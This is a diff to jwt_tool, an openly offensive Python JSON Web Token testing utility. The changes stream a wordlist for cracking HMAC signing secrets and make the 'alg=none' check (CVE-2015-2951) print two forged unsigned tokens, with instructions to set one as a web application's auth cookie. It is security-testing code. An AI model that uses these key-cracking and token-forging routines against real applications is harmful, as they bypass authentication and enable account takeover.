@@ -1,7 +1,7 @@
 #! /usr/bin/python
 
 #
-# JWT_Tool version 1.1 (08_06_2018)
+# JWT_Tool version 1.1.1 (16_10_2019)
 # Written by ticarpi
 # Please use responsibly...
 # Software URL: https://github.com/ticarpi/jwt_tool
@@ -39,9 +39,13 @@ def crackSig(sig, contents):
 	quiet = True
 	print "\nLoading key dictionary..."
 	print "File loaded: "+keyList
-	print "Testing "+str(numLines)+" passwords..."
-	for i in keyLst:
-		testKey(i, sig, contents, headDict, quiet)
+	print "Testing passwords in dictionary..."
+	keyLst = open(keyList, "r")
+	nextKey = keyLst.readline()
+	while nextKey:
+		testKey(nextKey.strip(), sig, contents, headDict, quiet)
+		nextKey = keyLst.readline()
+	print "Key not in dictionary"
 
 def testKey(key, sig, contents, headDict, quiet):
 	if headDict["alg"] == "HS256":
@@ -91,12 +95,16 @@ def signToken(headDict, paylDict, key, keyLength):
 	return newSig, badSig, newContents
 
 def checkCVE(headDict, tok2):
-	print "\nGenerating alg-stripped token..."
+	print "\nGenerating alg-stripped tokens..."
 	alg = "None"
 	newHead = buildHead(alg, headDict)
 	CVEToken = newHead+"."+tok2+"."
-	print "\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)"
-	print "\n"+CVEToken+"\n"
+	alg1 = "none"
+	newHead1 = buildHead(alg1, headDict)
+	CVEToken1 = newHead1+"."+tok2+"."
+	print "\nSet one of these new tokens as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)\n"
+	print "\"alg\": \"None\":\n"+CVEToken+""
+	print "\"alg\": \"none\":\n"+CVEToken1+"\n"
 
 def checkPubKey(headDict, tok2):
 	print "\nPlease enter the Public Key filename:"
@@ -180,7 +188,7 @@ def tamperToken(paylDict, headDict):
 		print "[3] HMAC-SHA512"
 		selLength = raw_input("> ")
 		if selLength == "2":
-			keyLength = 384	
+			keyLength = 384
 		elif selLength == "3":
 			keyLength = 512
 		else:
@@ -213,7 +221,7 @@ def tamperToken(paylDict, headDict):
 			print "[3] HMAC-SHA512"
 			selLength = raw_input("> ")
 			if selLength == "2":
-				keyLength = 384	
+				keyLength = 384
 			elif selLength == "3":
 				keyLength = 512
 			else:
@@ -248,10 +256,6 @@ if __name__ == '__main__':
 	key = ""
 	if len(sys.argv) == 3:
 		keyList = sys.argv[2]
-		numLines = sum(1 for line in open(keyList) if line.rstrip())
-		with open(keyList, "r") as f:
-		    keyLst = f.readlines()
-		keyLst = [x.strip() for x in keyLst]
 	else:
 		keyList = ""
 
@@ -277,7 +281,7 @@ if __name__ == '__main__':
   		print "[+] "+i+" = "+str(paylDict[i])
 	print "\n######################################################"
 	print "# Options:                                           #"
-	print "# 1: Check CVE-2015-2951 - alg=None vulnerability    #"
+	print "# 1: Check CVE-2015-2951 - alg=none vulnerability    #"
 	print "# 2: Check for Public Key bypass in RSA mode         #"
 	print "# 3: Check signature against a key                   #"
 	print "# 4: Check signature against a key file (\"kid\")      #"
@@ -310,5 +314,3 @@ if __name__ == '__main__':
 	else:
 		exit(1)
 	exit(1)
-
-	
